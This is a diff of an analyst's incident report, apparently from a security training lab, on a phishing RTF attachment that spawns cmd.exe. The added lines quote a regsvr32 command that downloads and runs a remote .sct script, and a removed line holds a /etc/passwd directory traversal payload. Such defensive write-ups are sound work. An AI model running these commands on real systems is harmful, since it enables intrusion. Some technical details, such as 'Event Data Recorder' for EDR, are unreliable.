@@ -18,7 +18,7 @@ What triggered the alert? What did the SOC monitoring tool flag, and why did it 
 
 **2. Initial Triage**
 First actions taken. What did I check first, and why that, before anything else?
-- Initially, I checked which destination `IP address/host` the source email address sent the mail to. After a successful identification, I pinpointed the compromised endpoint and promptly isolated it from the network to prevent any potential damage or unauthorized access. Following this, I delved into the endpoint security section to gather comprehensive information about the device, including its operating system, installed applications, and any recent activities that could indicate further security concerns. By quarantining the device, I aimed to safeguard the entire network from any additional attacks and mitigate the risk of lateral movement, which could allow threats to spread to other connected systems.
+- Initially, I checked which destination `IP address/host` the source email address sent the mail to; the IP belonged to a user named Austin in the letsdefend domain. After a successful identification, I pinpointed the compromised endpoint and promptly isolated it from the network to prevent any potential damage or unauthorized access. Following this, I delved into the endpoint security section to gather comprehensive information about the device, including its operating system, installed applications, and any recent activities that could indicate further security concerns. By quarantining the device, I aimed to safeguard the entire network from any additional attacks and mitigate the risk of lateral movement, which could allow threats to spread to other connected systems.
 
 <br>
 
@@ -26,6 +26,7 @@ First actions taken. What did I check first, and why that, before anything else?
 
 | Time | Action | Result |
 |---|---|---|
+| 12:10 | Reviewed CVE linked to the rule | CVE-2025-21298 |
 | 12:15 | Reviewed Email Security on the source endpoint | Found a matching email from the source IP, with the time it was sent and an attachment: `mail.rtf`. |
 | 12:22 | Reviewed log management logs | Found that the destination IP address `172.16.17.137` made a **GET** request to the source IP address `84.38.130.118` via *http*. |
 | 12:30 | Reviewed log management logs | Found raw data: Process: `cmd.exe`, Process ID: `6784`, Request URL: *http://84.38.130.118.com/shell.sct*. |
@@ -33,6 +34,7 @@ First actions taken. What did I check first, and why that, before anything else?
 | 12:40 | Reviewed endpoint network connections | Found and confirmed the Source IP address that made the connection. |
 | 12:45 | Reviewed endpoint terminal history | Identified the command line as well. |
 | 12:48 | Reviewed endpoint Broswer history | Found no matching data. |
+| 12:48 | Quickly reviewed the MITRE ATT&CK linked to the rule | T1566, T1059.001, T1574.002 |
 
 <br>
 
@@ -41,13 +43,15 @@ Step-by-step walkthrough of the analysis:
 - Logs/tools reviewed:
    - Log Management Tool: To confirm the connection pattern and frequency.
    - Endpoint Security (EDR): To check what process on the host initiated the connection.
-   - Endpoint Security (EDR): To collect data from the network action, terminal history, and browser history plugins on the host that initiated the connection..
+   - Endpoint Security (EDR): To collect data from the network action, terminal history, and browser history plugins on the host that initiated the connection.
    - DNS logs: To see if the destination IP was reached via a domain lookup or a hardcoded IP.
-   - VirusTotal: Checked the reputation of the source IP and any associated domain.
+   - VirusTotal: Checked the reputation of the source IP, associated domain, and the malicious attachment.
 - Indicators found:
-   - The source IP `84.38.130.118`, port `24124`, sent a POST request to the firewall(Check Point Security Gateway) requesting the `/clients/MyCRL` remote path to access the directory where the users are stored by modifying and sending another POST request that contain the directory traversal payload `aCSHELL/../../../../../../../../../../etc/passwd`.
-   - EDR failed to indicate that the connection originated from the firewall shell; instead, it provided details about the network connection, showing the destination IP address and the active processes, including their IDs.
-   - No matching DNS query preceded the connections — the IP was hardcoded, not resolved via a domain.
+   - The source IP address `84.38.130.118` on port `80`, along with the email address `projectmanagement@pm.me`, sent an email to the destination IP address mentioned above. The email contained more than 20 words and included a malicious attachment that claimed to be from the project management team.
+   - The EDR (Event Data Recorder) provided crucial information that was identified as **vital** for analysis, along with the specific time and date when this data was flagged. This information is essential for understanding the context and circumstances surrounding the event:
+       - Feb 04 2025 08:06:42 - Source IP: `84.38.130.118`
+       - Feb 04 2025 08:06:08 - `"C:\Windows\System32\cmd.exe /c regsvr32.exe /s /u /i:http://84.38.130.118.com/shell.sct scrobj.dll"`
+   - A matching DNS query was submitted linking to the source IP: `projectmanagement@pm.me`.
    - VirusTotal flagged the IP as malicious (7/94 vendors), associated with China Unicom Global.
 
 - Any pivoting done:
